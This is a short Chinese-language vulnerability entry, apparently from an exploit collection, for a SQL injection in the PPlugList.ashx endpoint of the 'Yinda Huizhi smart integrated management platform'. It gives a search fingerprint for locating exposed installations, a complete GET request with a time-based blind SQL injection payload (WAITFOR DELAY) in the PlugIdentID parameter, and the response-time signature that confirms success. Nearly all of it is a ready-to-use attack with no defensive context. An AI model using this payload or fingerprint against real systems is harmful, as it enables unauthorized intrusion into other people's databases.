# 银达汇智智慧综合管理平台PPlugList存在SQL注入漏洞

银达汇智智慧综合管理平台 ｜ SQL注入 ｜ —
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`GET /Module/CJGL/Controller/PPlugList.ashx?action=find&PlugIdentID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s